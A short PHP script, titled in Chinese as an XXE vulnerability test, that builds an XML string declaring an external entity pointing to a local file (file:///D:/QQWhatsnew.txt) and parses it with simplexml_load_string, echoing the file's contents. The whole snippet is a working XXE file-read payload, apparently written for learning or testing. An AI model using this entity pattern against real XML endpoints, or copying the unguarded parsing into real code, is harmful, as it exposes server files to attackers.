 <?php 
header("Content-type: text/html; charset=utf-8"); 
echo "<h3>xxe漏洞测试！</h3>";  
$xml = '<?xml version="1.0" encoding="utf-8"?> 
    <!DOCTYPE xdsec   
    [ <!ELEMENT methodname ANY > <!ENTITY xxe SYSTEM "file:///D:/QQWhatsnew.txt" >]>   
    <root> <name>&xxe;</name> </root>';  
    try{   
    $doc = simplexml_load_string($xml); echo $doc->name;  
    }   
    catch(Exception $e){   
print "error";   
}  
?> 